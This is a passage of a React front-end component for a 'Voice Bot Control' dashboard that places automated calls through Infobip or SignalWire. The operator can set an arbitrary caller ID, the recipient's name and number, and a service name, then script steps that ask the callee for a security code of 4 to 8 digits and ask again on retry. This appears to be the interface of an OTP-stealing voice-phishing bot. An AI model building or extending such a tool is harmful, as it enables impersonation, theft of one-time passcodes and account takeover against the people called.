                    <div className="font-mono text-sm text-slate-300">
                      Duration: {recordingDuration ? `${recordingDuration}s` : "Available"}
                    </div>
                  </div>
                </div>
                <audio 
                  controls 
                  className="w-full h-10 rounded-lg"
                  style={{ 
                    filter: 'sepia(20%) saturate(70%) grayscale(0) brightness(100%) hue-rotate(220deg)'
                  }}
                  data-testid="recording-audio"
                >
                  <source src={recordingUrl} type="audio/mpeg" />
                  Your browser does not support the audio element.
                </audio>
              </motion.div>
            )}
        </div>

        {/* Right Panel - Call Setup */}
        <div className="setup-panel" data-testid="setup-panel">
          {/* Provider Tabs */}
          <div className="flex items-center gap-2 mb-3" data-testid="provider-tabs">
            <button
              onClick={() => setSelectedProvider("infobip")}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md font-mono text-[10px] uppercase tracking-wider transition-all ${
                selectedProvider === "infobip"
                  ? "bg-cyan-500/20 text-cyan-400 border border-cyan-500/50"
                  : "bg-white/5 text-slate-400 border border-white/10 hover:bg-white/10"
              }`}
              data-testid="provider-ch1"
            >
              <span className={`w-2 h-2 rounded-full ${infobipConfigured ? "bg-emerald-400" : "bg-yellow-400"}`} />
              CH: 1 (Infobip)
            </button>
            <button
              onClick={() => setSelectedProvider("signalwire")}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-md font-mono text-[10px] uppercase tracking-wider transition-all ${
                selectedProvider === "signalwire"
                  ? "bg-purple-500/20 text-purple-400 border border-purple-500/50"
                  : "bg-white/5 text-slate-400 border border-white/10 hover:bg-white/10"
              }`}
              data-testid="provider-ch2"
            >
              <span className={`w-2 h-2 rounded-full ${signalwireConfigured ? "bg-emerald-400" : "bg-yellow-400"}`} />
              CH: 2 (SignalWire)
            </button>
          </div>

          {/* Header */}
          <div className="flex items-center justify-between mb-3">
            <h1 className="font-heading text-lg font-bold text-white">
              Voice Bot Control
            </h1>
            <Badge 
              variant="default"
              className={`text-[10px] px-2 py-0.5 ${
                selectedProvider === "signalwire" 
                  ? (signalwireConfigured ? "bg-purple-500/20 text-purple-400 border-purple-500/30" : "bg-yellow-500/20 text-yellow-400 border-yellow-500/30")
                  : (infobipConfigured ? "bg-cyan-500/20 text-cyan-400 border-cyan-500/30" : "bg-yellow-500/20 text-yellow-400 border-yellow-500/30")
              }`}
            >
              {selectedProvider === "signalwire" 
                ? (signalwireConfigured ? "SignalWire" : "Simulation")
                : (infobipConfigured ? "Infobip" : "Simulation")
              }
            </Badge>
          </div>
          
          {/* Call Configuration */}
          <div className="form-section glass-panel p-3 rounded-lg mb-3" data-testid="call-config-section">
            <h3 className="section-title">
              <Settings className="w-4 h-4" />
              Call Configuration
            </h3>
            
            <div className="form-grid">
              <div>
                <label className="form-label">Call Type</label>
                <Select value={callType} onValueChange={setCallType}>
                  <SelectTrigger className="glass-input font-mono text-cyan-100" data-testid="call-type-select">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-slate-900 border-slate-800">
                    {CALL_TYPES.map((type) => (
                      <SelectItem 
                        key={type.id} 
                        value={type.id}
                        className="font-mono text-xs"
                      >
                        {type.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              <div>
                <label className="form-label">Voice Model</label>
                <Select value={voiceModel} onValueChange={setVoiceModel}>
                  <SelectTrigger className="glass-input font-mono text-cyan-100" data-testid="voice-model-select">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-slate-900 border-slate-800">
                    {VOICE_MODELS.map((model) => (
                      <SelectItem 
                        key={model.id} 
                        value={model.id}
                        className="font-mono text-xs"
                      >
                        {model.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              <div>
                <label className="form-label">
                  Caller ID
                </label>
                <Input
                  type="text"
                  value={fromNumber}
                  onChange={(e) => setFromNumber(e.target.value)}
                  className="glass-input font-mono text-cyan-100"
                  placeholder="+18085821342"
                  data-testid="from-number-input"
                />
              </div>
              
              <div>
                <label className="form-label">
                  Recipient Name
                </label>
                <Input
                  type="text"
                  value={recipientName}
                  onChange={(e) => setRecipientName(e.target.value)}
                  className="glass-input font-mono text-cyan-100"
                  placeholder="John Doe"
                  data-testid="recipient-name-input"
                />
              </div>
              
              <div>
                <label className="form-label">
                  Recipient Number
                </label>
                <Input
                  type="text"
                  value={recipientNumber}
                  onChange={(e) => setRecipientNumber(e.target.value)}
                  className="glass-input font-mono text-cyan-100"
                  placeholder="+525547000906"
                  data-testid="recipient-number-input"
                />
              </div>
              
              <div>
                <label className="form-label">
                  Service Name
                </label>
                <Input
                  type="text"
                  value={serviceName}
                  onChange={(e) => setServiceName(e.target.value)}
                  className="glass-input font-mono text-cyan-100"
                  placeholder="MyCompany"
                  data-testid="service-name-input"
                />
              </div>
              
              <div>
                <label className="form-label">
                  OTP Digits
                </label>
                <Select value={otpDigits} onValueChange={setOtpDigits}>
                  <SelectTrigger className="glass-input font-mono text-cyan-100" data-testid="otp-digits-select">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-slate-900 border-slate-800">
                    {[4, 5, 6, 7, 8].map((num) => (
                      <SelectItem 
                        key={num} 
                        value={num.toString()}
                        className="font-mono text-xs"
                      >
                        {num}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              <div className="flex items-end">
                <Button 
                  variant="outline"
                  className={`w-full glass-input border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10 font-mono text-[10px] uppercase tracking-wider ${isPreviewing ? 'bg-cyan-500/20 border-cyan-400' : ''}`}
                  data-testid="preview-voice-btn"
                  onClick={isPreviewing ? stopPreview : previewVoice}
                >
                  {isPreviewing ? (
                    <>
                      <VolumeX className="w-3 h-3 mr-1" />
                      Stop
                    </>
                  ) : (
                    <>
                      <Volume2 className="w-3 h-3 mr-1" />
                      Preview
                    </>
                  )}
                </Button>
              </div>
            </div>
          </div>

          {/* Call Steps Configuration */}
          <div className="form-section glass-panel p-3 rounded-lg mb-3" data-testid="call-steps-section">
            <h3 className="section-title">
              <Layers className="w-4 h-4" />
              Call Steps
            </h3>
            
            <Tabs value={activeStep} onValueChange={setActiveStep} className="w-full">
              <TabsList className="w-full bg-black/40 border border-white/5 p-0.5 rounded-md h-7" data-testid="call-steps-tabs">
                {["step1", "step2", "step3", "accepted", "rejected"].map((step) => (
                  <TabsTrigger
                    key={step}
                    value={step}
                    className={`flex-1 font-mono text-[10px] uppercase tracking-wider border border-transparent h-6
                      data-[state=active]:bg-cyan-500/10 data-[state=active]:text-cyan-400 data-[state=active]:border-cyan-500/30
                      ${currentStep === step ? 'ring-1 ring-emerald-500/50' : ''}`}
                    data-testid={`step-tab-${step}`}
                  >
                    {step === "accepted" ? "Accept" : step === "rejected" ? "Retry" : `S${step.slice(-1)}`}
                  </TabsTrigger>
                ))}
              </TabsList>
              
              {["step1", "step2", "step3", "accepted", "rejected"].map((step) => (
                <TabsContent key={step} value={step} className="mt-2">
                  <label className="form-label text-[9px]">
                    {step === "step1" && "Step 1 - Greetings (DTMF: 0/1)"}
                    {step === "step2" && "Step 2 - Ask Security Code"}
                    {step === "step3" && "Step 3 - Wait Message"}
                    {step === "accepted" && "Accept - End Message"}
                    {step === "rejected" && "Retry - Ask Code Again"}
                  </label>
                  <Textarea
                    value={stepMessages[step]}
                    onChange={(e) => setStepMessages({ ...stepMessages, [step]: e.target.value })}
                    className="glass-input form-textarea font-mono text-cyan-100"
                    placeholder={`TTS message for ${step}...`}
                    rows={2}
                    data-testid={`step-message-${step}`}
                  />
                  <div className="mt-1 text-[9px] text-slate-500 font-mono">
                    Variables: {"{name}"}, {"{service}"}, {"{digits}"}
                  </div>
                </TabsContent>
              ))}
            </Tabs>
          </div>

          {/* Call Button */}
          <motion.div
            whileHover={{ scale: 1.01 }}
            whileTap={{ scale: 0.99 }}
          >
            {!isCallActive ? (
              <button
                onClick={handleStartCall}
                disabled={isLoading || !recipientNumber}
                className={`call-button call-button-start btn-primary ${isLoading ? 'opacity-50' : ''}`}
                data-testid="start-call-btn"
              >
                {isLoading ? (
                  <RefreshCw className="w-4 h-4 animate-spin" />
                ) : (
                  <Play className="w-4 h-4" />
                )}
                {isLoading ? "Initiating..." : "Start Call"}
              </button>
            ) : (
              <button
                onClick={handleHangUp}
                disabled={isLoading}
                className={`call-button call-button-stop ${isLoading ? 'opacity-50' : ''}`}
                data-testid="hangup-btn"
              >
                {isLoading ? (
                  <RefreshCw className="w-4 h-4 animate-spin" />
                ) : (
                  <PhoneOff className="w-4 h-4" />
                )}
                {isLoading ? "Terminating..." : "Hang Up"}
              </button>
            )}
          </motion.div>
        </div>
      </div>
    </div>
  );
}

export default App;
